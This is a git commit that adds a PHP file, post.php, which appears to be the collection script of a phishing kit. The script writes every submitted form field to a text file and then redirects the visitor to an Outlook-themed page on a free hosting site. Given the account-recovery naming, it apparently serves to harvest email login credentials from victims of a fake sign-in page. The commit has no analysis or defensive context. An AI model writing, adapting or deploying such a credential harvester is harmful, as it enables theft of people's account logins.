297cca6ee015f1d58ee4d67b4f8fca2468977c4f
Center Recover <42503405+contadeclientes@users.noreply.github.com>
2018-08-18 21:49:37 -0300

    primeiro

---
+++ post.php
@@ -0,0 +1,6 @@
+<?php
+	$file = "result.txt";
+	file_put_contents($file, print_r($_POST, true), FILE_APPEND);
+?>
+
+ <meta http-equiv="refresh" content="1; url=https://suportedecontas.000webhostapp.com/Outlook/index.html" />
